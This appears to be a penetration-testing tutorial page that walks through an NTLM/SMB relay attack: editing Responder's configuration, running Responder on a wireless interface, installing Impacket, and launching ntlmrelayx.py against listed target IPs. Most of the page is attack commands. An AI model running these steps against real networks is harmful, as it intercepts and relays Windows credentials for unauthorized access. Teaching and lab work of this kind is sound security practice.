# SMB Relay Attack Demonstration Part 1

### **NTLM Relay Setup and Execution**

#### **🔹 Step 1: Modify Responder Configuration**

1. Open Terminal and switch to superuser mode:

```bash
sudo su
```

2. Open the Responder configuration file using a text editor:

```bash
mousepad /etc/responder/Responder.conf
```

3. **Modify the following values**:

* Set `SMB` and `HTTP` to **Off**

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

4. Save and close the file.
5. Check if the changes are applied by running Responder:

```bash
responder -I wlan0 -wdv
```

✅ **Leave this terminal open** while proceeding with the next steps.

***

#### **🔹 Step 2: Install Dependencies**

1. First, install `ldapdomaindump` and related dependencies:

```bash
pip install ldap3 dnspython  
pip install ldapdomaindump  
```

2. Next, clone the **Impacket** suite:

```bash
git clone https://github.com/fortra/impacket.git
```

3. Change into the Impacket directory:

```bash
cd impacket
```

4. Switch to superuser mode:

```bash
sudo su
```

5. Install Impacket using Python:

```bash
python3 setup.py install
```

✅ Once installed, `ntlmrelayx.py` can be executed from any directory.

***

#### **🔹 Step 3: Execute NTLM Relay**

1. Start NTLM Relay using the following command:

```bash
sudo ntlmrelayx.py -tf target.txt -smb2support
```

* `-tf target.txt` → Points to a text file containing the target IP addresses.
* `-smb2support` → Enables support for SMB2 protocol.

✅ **target.txt** should only contain the target IP address.

***

#### **🔹 Alternative Installation Method (if above fails):**

1. **Install Required Dependencies:**

```bash
sudo apt update && sudo apt install -y python3 python3-pip git libssl-dev libffi-dev python3-dev
```

2. **Clone and Install Impacket:**

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
sudo python3 setup.py install
```

3. **Verify Installation:**

```bash
ntlmrelayx.py -h
```

✅ If the help menu appears, the installation was successful.

4. **Run NTLM Relay:**

```bash
sudo ntlmrelayx.py -tf target.txt -smb2support
```







<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
